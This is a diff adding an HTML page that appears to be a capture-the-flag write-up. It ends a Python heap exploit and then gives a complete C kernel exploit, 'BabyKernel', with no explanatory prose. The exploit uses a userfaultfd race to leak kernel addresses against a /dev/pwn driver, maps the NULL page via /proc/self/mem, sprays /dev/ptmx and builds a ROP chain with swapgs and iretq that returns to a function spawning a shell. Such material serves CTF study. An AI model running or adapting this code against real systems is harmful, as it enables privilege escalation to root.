+</span><span class="hljs-keyword">add</span><span class="bash">(<span class="hljs-string">"a"</span>,0x60,<span class="hljs-string">"a"</span>*0x13+p64(libc+0xf02a4))
+</span>remove(<span class="hljs-number">0</span>)
+remove(<span class="hljs-number">0</span>)
+
+
+r.interactive()
+</code></pre><h3 id="babykernel"><a class="header-link" href="#babykernel"></a>BabyKernel</h3>
+<pre class="hljs"><code><span class="hljs-meta">#define _GNU_SOURCE</span>
+<span class="hljs-meta">#include &lt;sys/types.h&gt;</span>
+<span class="hljs-meta">#include &lt;stdio.h&gt;</span>
+<span class="hljs-meta">#include &lt;pthread.h&gt;</span>
+<span class="hljs-meta">#include &lt;errno.h&gt;</span>
+<span class="hljs-meta">#include &lt;unistd.h&gt;</span>
+<span class="hljs-meta">#include &lt;stdlib.h&gt;</span>
+<span class="hljs-meta">#include &lt;fcntl.h&gt;</span>
+<span class="hljs-meta">#include &lt;signal.h&gt;</span>
+<span class="hljs-meta">#include &lt;poll.h&gt;</span>
+<span class="hljs-meta">#include &lt;string.h&gt;</span>
+<span class="hljs-meta">#include &lt;sys/mman.h&gt;</span>
+<span class="hljs-meta">#include &lt;sys/syscall.h&gt;</span>
+<span class="hljs-meta">#include &lt;sys/ioctl.h&gt;</span>
+<span class="hljs-meta">#include &lt;poll.h&gt;</span>
+<span class="hljs-meta">#include &lt;stdint.h&gt;</span>
+
+<span class="hljs-meta">#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \</span>
+                       } <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>)
+<span class="hljs-meta">#define __u64 uint64_t</span>
+<span class="hljs-meta">#define __u32 uint32_t</span>
+<span class="hljs-meta">#define __u16 uint16_t</span>
+<span class="hljs-meta">#define __u8  uint8_t</span>
+<span class="hljs-meta">#define __s64 int64_t</span>
+
+<span class="hljs-meta">#define UFFDIO_API 0xc018aa3f</span>
+<span class="hljs-meta">#define UFFDIO_REGISTER 0xc020aa00</span>
+<span class="hljs-meta">#define UFFDIO_COPY 0xc028aa03</span>
+
+<span class="hljs-meta">#define UFFD_API ((__u64)0xAA)      </span>
+<span class="hljs-meta">#define __NR_userfaultfd 323 </span>
+<span class="hljs-keyword">struct</span> uffdio_range {
+    __u64 start;
+    __u64 len;
+};
+<span class="hljs-keyword">struct</span> uffdio_copy {
+    __u64 dst;
+    __u64 src;
+    __u64 len;
+
+<span class="hljs-meta">#define UFFDIO_COPY_MODE_DONTWAKE        ((__u64)1&lt;&lt;0)</span>
+    __u64 mode;
+    __s64 copy;
+};
+
+<span class="hljs-keyword">struct</span> uffd_msg {
+    __u8    event;
+
+    __u8    reserved1;
+    __u16    reserved2;
+    __u32    reserved3;
+
+    union {
+        <span class="hljs-keyword">struct</span> {
+            __u64    flags;
+            __u64    address;
+            union {
+                __u32 ptid;
+            } feat;
+        } pagefault;
+
+        <span class="hljs-keyword">struct</span> {
+            __u32    ufd;
+        } fork;
+
+        <span class="hljs-keyword">struct</span> {
+            __u64    from;
+            __u64    to;
+            __u64    len;
+        } remap;
+
+        <span class="hljs-keyword">struct</span> {
+            __u64    start;
+            __u64    end;
+        } remove;
+
+        <span class="hljs-keyword">struct</span> {
+            <span class="hljs-comment">/* unused reserved fields */</span>
+            __u64    reserved1;
+            __u64    reserved2;
+            __u64    reserved3;
+        } reserved;
+    } arg;
+} __packed;
+
+
+
+<span class="hljs-keyword">struct</span> uffdio_api {
+    __u64 api;
+
+<span class="hljs-meta">#define UFFD_FEATURE_PAGEFAULT_FLAG_WP        (1&lt;&lt;0)</span>
+<span class="hljs-meta">#define UFFD_FEATURE_EVENT_FORK            (1&lt;&lt;1)</span>
+<span class="hljs-meta">#define UFFD_FEATURE_EVENT_REMAP        (1&lt;&lt;2)</span>
+<span class="hljs-meta">#define UFFD_FEATURE_EVENT_REMOVE        (1&lt;&lt;3)</span>
+<span class="hljs-meta">#define UFFD_FEATURE_MISSING_HUGETLBFS        (1&lt;&lt;4)</span>
+<span class="hljs-meta">#define UFFD_FEATURE_MISSING_SHMEM        (1&lt;&lt;5)</span>
+<span class="hljs-meta">#define UFFD_FEATURE_EVENT_UNMAP        (1&lt;&lt;6)</span>
+<span class="hljs-meta">#define UFFD_FEATURE_SIGBUS            (1&lt;&lt;7)</span>
+<span class="hljs-meta">#define UFFD_FEATURE_THREAD_ID            (1&lt;&lt;8)</span>
+    __u64 features;
+
+    __u64 ioctls;
+};
+
+<span class="hljs-keyword">struct</span> uffdio_register {
+    <span class="hljs-keyword">struct</span> uffdio_range range;
+<span class="hljs-meta">#define UFFDIO_REGISTER_MODE_MISSING    ((__u64)1&lt;&lt;0)</span>
+<span class="hljs-meta">#define UFFDIO_REGISTER_MODE_WP        ((__u64)1&lt;&lt;1)</span>
+    __u64 mode;
+    __u64 ioctls;
+};       
+
+<span class="hljs-keyword">void</span> get_NULL(){
+    <span class="hljs-keyword">void</span> *map = mmap((<span class="hljs-keyword">void</span>*)<span class="hljs-number">0x10000</span>, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE,
+                   MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);
+    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">"/proc/self/mem"</span>, O_RDWR);
+      unsigned <span class="hljs-keyword">long</span> addr = (unsigned <span class="hljs-keyword">long</span>)map;
+      <span class="hljs-keyword">while</span> (addr != <span class="hljs-number">0</span>) {
+        addr -= <span class="hljs-number">0x1000</span>;
+        lseek(fd, addr, SEEK_SET);
+            <span class="hljs-keyword">char</span> cmd[<span class="hljs-number">1000</span>];
+        sprintf(cmd, <span class="hljs-string">"LD_DEBUG=help su --help 2&gt;&amp;%d"</span>, fd);
+            system(cmd);
+      }
+    close(fd);
+    printf(<span class="hljs-string">"data at NULL: 0x%lx\n"</span>, *(unsigned <span class="hljs-keyword">long</span> *)<span class="hljs-number">0</span>);
+}
+<span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> page_size;
+<span class="hljs-keyword">char</span> *fault;
+<span class="hljs-keyword">int</span> pfd[<span class="hljs-number">0x1000</span>];
+<span class="hljs-keyword">int</span> tmp;
+
+size_t user_cs, user_ss, user_rflags, user_sp;
+<span class="hljs-keyword">void</span> save_status()
+{
+    __asm__(<span class="hljs-string">"mov user_cs, cs;"</span>
+            <span class="hljs-string">"mov user_ss, ss;"</span>
+            <span class="hljs-string">"mov user_sp, rsp;"</span>
+            <span class="hljs-string">"pushf;"</span>
+            <span class="hljs-string">"pop user_rflags;"</span>
+            );
+
+}
+
+<span class="hljs-keyword">void</span> get_shell(<span class="hljs-keyword">int</span> sig){
+    system(<span class="hljs-string">"sh"</span>);
+}
+<span class="hljs-keyword">void</span>* job(<span class="hljs-keyword">void</span>* x){
+    sleep(<span class="hljs-number">1</span>);
+    fault = (<span class="hljs-keyword">void</span>*)mmap((<span class="hljs-keyword">void</span>*)<span class="hljs-number">0x2468000</span>,<span class="hljs-number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);
+}
+
+<span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *
+fault_handler_thread(<span class="hljs-keyword">void</span> *arg)
+{
+
+   <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;     <span class="hljs-comment">/* Number of faults so far handled */</span>
+   <span class="hljs-keyword">long</span> uffd;                    <span class="hljs-comment">/* userfaultfd file descriptor */</span>
+   <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> *page = NULL;
+   ssize_t nread;
+   <span class="hljs-keyword">struct</span> uffdio_copy uffdio_copy;
+   <span class="hljs-keyword">static</span> <span class="hljs-keyword">struct</span> uffd_msg msg;
+   uffd = (<span class="hljs-keyword">long</span>) arg;
+
+   <span class="hljs-comment">/* Create a page that will be copied into the faulting region */</span>
+
+   <span class="hljs-keyword">if</span> (page == NULL) {
+       page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
+                   MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);
+       <span class="hljs-keyword">if</span> (page == MAP_FAILED)
+           errExit(<span class="hljs-string">"mmap"</span>);
+   }
+
+   <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd
+      file descriptor */</span>
+
+   <span class="hljs-keyword">for</span> (;;) {
+
+       <span class="hljs-comment">/* See what poll() tells us about the userfaultfd */</span>
+
+       <span class="hljs-keyword">struct</span> pollfd pollfd;
+       <span class="hljs-keyword">int</span> nready;
+       pollfd.fd = uffd;
+       pollfd.events = POLLIN;
+       nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);
+       <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)
+           errExit(<span class="hljs-string">"poll"</span>);
+       munmap(fault,<span class="hljs-number">0x1000</span>);
+       <span class="hljs-comment">/* Read an event from the userfaultfd */</span>
+       read(uffd,&amp;msg,sizeof(msg));
+       uffdio_copy.dst = (unsigned <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp;
+                                                  ~(page_size - <span class="hljs-number">1</span>);
+        uffdio_copy.len = page_size;
+           uffdio_copy.mode = <span class="hljs-number">0</span>;
+           uffdio_copy.copy = <span class="hljs-number">0</span>;
+           <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)
+                errExit(<span class="hljs-string">"ioctl-UFFDIO_COPY"</span>);   
+
+
+
+   }
+}
+
+<span class="hljs-keyword">int</span> main(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])
+{
+   <span class="hljs-keyword">long</span> uffd;          <span class="hljs-comment">/* userfaultfd file descriptor */</span>
+   <span class="hljs-keyword">char</span> *addr;         <span class="hljs-comment">/* Start of region handled by userfaultfd */</span>
+   unsigned <span class="hljs-keyword">long</span> len;  <span class="hljs-comment">/* Length of region handled by userfaultfd */</span>
+   pthread_t thr;      <span class="hljs-comment">/* ID of thread that handles page faults */</span>
+   <span class="hljs-keyword">struct</span> uffdio_api uffdio_api;
+   <span class="hljs-keyword">struct</span> uffdio_register uffdio_register;
+   <span class="hljs-keyword">int</span> s;
+
+   page_size = sysconf(_SC_PAGE_SIZE);
+   len =  page_size;
+
+   <span class="hljs-comment">/* Create and enable userfaultfd object */</span>
+
+   uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+   <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)
+       errExit(<span class="hljs-string">"userfaultfd"</span>);
+
+   uffdio_api.api = UFFD_API;
+   uffdio_api.features = <span class="hljs-number">0</span>;
+   <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)
+       errExit(<span class="hljs-string">"ioctl-UFFDIO_API"</span>);
+
+   <span class="hljs-comment">/* Create a private anonymous mapping. The memory will be
+      demand-zero paged--that is, not yet allocated. When we
+      actually touch the memory, it will be allocated via
+      the userfaultfd. */</span>
+
+   addr = mmap(NULL, len, PROT_READ | PROT_WRITE,
+               MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);
+   <span class="hljs-keyword">if</span> (addr == MAP_FAILED)
+       errExit(<span class="hljs-string">"mmap"</span>);
+
+
+
+   <span class="hljs-comment">/* Register the memory range of the mapping we just created for
+      handling by the userfaultfd object. In mode, we request to track
+      missing pages (i.e., pages that have not yet been faulted in). */</span>
+
+   uffdio_register.range.start = (unsigned <span class="hljs-keyword">long</span>) addr;
+   uffdio_register.range.len = len;
+   uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
+   <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)
+       errExit(<span class="hljs-string">"ioctl-UFFDIO_REGISTER"</span>);
+
+   <span class="hljs-comment">/* Create a thread that will process the userfaultfd events */</span>
+
+   s = pthread_create(&amp;thr, NULL, fault_handler_thread, (<span class="hljs-keyword">void</span> *) uffd);
+   <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>) {
+       errno = s;
+       errExit(<span class="hljs-string">"pthread_create"</span>);
+   }
+   save_status();
+   get_NULL();
+   <span class="hljs-keyword">signal</span>(SIGSEGV,get_shell);
+   <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">"/dev/pwn"</span>,O_RDONLY);
+   uint64_t buf[<span class="hljs-number">0x22</span>];
+   <span class="hljs-keyword">char</span> *addr2 = (<span class="hljs-keyword">void</span>*)mmap((<span class="hljs-keyword">void</span>*)<span class="hljs-number">0x1234000</span>,<span class="hljs-number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);
+   fault = (<span class="hljs-keyword">void</span>*)mmap((<span class="hljs-keyword">void</span>*)<span class="hljs-number">0x2468000</span>,<span class="hljs-number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);
+   size_t kcode = <span class="hljs-number">0</span>;
+
+    memset(addr2,<span class="hljs-number">0</span>,<span class="hljs-number">0x1000</span>);
+    buf[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;
+    buf[<span class="hljs-number">1</span>] = (size_t)addr2;
+    buf[<span class="hljs-number">2</span>] = <span class="hljs-number">0x400</span>;
+    ioctl(fd,<span class="hljs-number">111</span>,buf);
+    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x1000</span>;i++)
+        pfd[i] = open(<span class="hljs-string">"/dev/ptmx/"</span>,O_RDWR);
+    buf[<span class="hljs-number">0x21</span>] = <span class="hljs-number">0</span>;
+    buf[<span class="hljs-number">0</span>] = <span class="hljs-number">4</span>;
+    buf[<span class="hljs-number">1</span>] = (size_t)addr2;
+    buf[<span class="hljs-number">2</span>] = <span class="hljs-number">0x300</span>;
+    buf[<span class="hljs-number">3</span>] = (size_t)fault;
+    buf[<span class="hljs-number">4</span>] = <span class="hljs-number">0x80</span>;
+    buf[<span class="hljs-number">5</span>] = (size_t)addr;
+    buf[<span class="hljs-number">6</span>] = <span class="hljs-number">0x80</span>;
+    buf[<span class="hljs-number">7</span>] = (size_t)addr2;
+    buf[<span class="hljs-number">8</span>] = <span class="hljs-number">0x300</span>;    
+    pthread_t tid;
+    pthread_create(&amp;tid,NULL,job,NULL);
+    ioctl(fd,<span class="hljs-number">222</span>,buf);
+    pthread_join(tid,NULL);
+    size_t *p = (size_t*)addr2;
+    kcode = p[<span class="hljs-number">7</span>];
+    buf[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">if</span>( kcode &lt; <span class="hljs-number">0xff00000000000000</span> ){
+        puts(<span class="hljs-string">"Leak Failed"</span>);    
+        ioctl(fd,<span class="hljs-number">444</span>,buf);
+        exit(<span class="hljs-number">-1</span>);
+    }
+    kcode -= <span class="hljs-number">0x17b08c0</span>;
+    printf(<span class="hljs-string">"%p\n"</span>,(<span class="hljs-keyword">void</span>*)kcode);
+    ioctl(fd,<span class="hljs-number">444</span>,buf);
+    kcode -= <span class="hljs-number">0xffffffff81000000</span>;
+        size_t *rop = (size_t*)&amp;addr2[<span class="hljs-number">0x10</span>];
+    <span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;
+
+
+    rop[i++] = kcode + <span class="hljs-number">0xffffffff81086800</span>; <span class="hljs-comment">// : pop rdi ; ret;</span>
+    rop[i++] = <span class="hljs-number">0</span>;
+    rop[i++] = kcode + <span class="hljs-number">0xffffffff810b9db0</span>;
+    rop[i++] = kcode + <span class="hljs-number">0xffffffff8151224c</span>; <span class="hljs-comment">//: push rax ; pop rdi ; add byte ptr [rax], al ; pop rbp ; ret</span>
+    rop[i++] = <span class="hljs-number">0</span>;
+    rop[i++] = kcode + <span class="hljs-number">0xffffffff810b9a00</span>;
+
+
+        rop[i++] = kcode + <span class="hljs-number">0xffffffff81070894</span>; <span class="hljs-comment">// swapgs ; pop rbp ; ret</span>
+        rop[i++] = <span class="hljs-number">0</span>;
+        rop[i++] = kcode+<span class="hljs-number">0xffffffff81036bfb</span>; <span class="hljs-comment">// iretq</span>
+        rop[i++] = (size_t)get_shell;
+        rop[i++] = user_cs;                <span class="hljs-comment">/* saved CS */</span>
+        rop[i++] = user_rflags;            <span class="hljs-comment">/* saved EFLAGS */</span>
+        rop[i++] = user_sp;
+        rop[i++] = user_ss;
+
+    rop[i++] = kcode + <span class="hljs-number">0xffffffff8100021e</span>;
+    buf[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;
+    buf[<span class="hljs-number">1</span>] = (size_t)addr2;
+    buf[<span class="hljs-number">2</span>] = <span class="hljs-number">0x400</span>;
+    ioctl(fd,<span class="hljs-number">111</span>,buf);
+    buf[<span class="hljs-number">0x21</span>] = <span class="hljs-number">0</span>;
+    *(size_t*)<span class="hljs-number">0</span> = kcode+<span class="hljs-number">0xffffffff81488731</span>;
+    buf[<span class="hljs-number">0x21</span>] = <span class="hljs-number">0</span>;
+    buf[<span class="hljs-number">1</span>] = (size_t)addr2+<span class="hljs-number">0xff8</span>;
+    buf[<span class="hljs-number">2</span>] = <span class="hljs-number">0x10</span>;
+    ioctl(fd,<span class="hljs-number">333</span>,buf);
+    ioctl(fd,<span class="hljs-number">333</span>,buf);
+
+
+
+}
+</code></pre>        </article>
+      </div>
+    </div>
+  </body>
+</html>
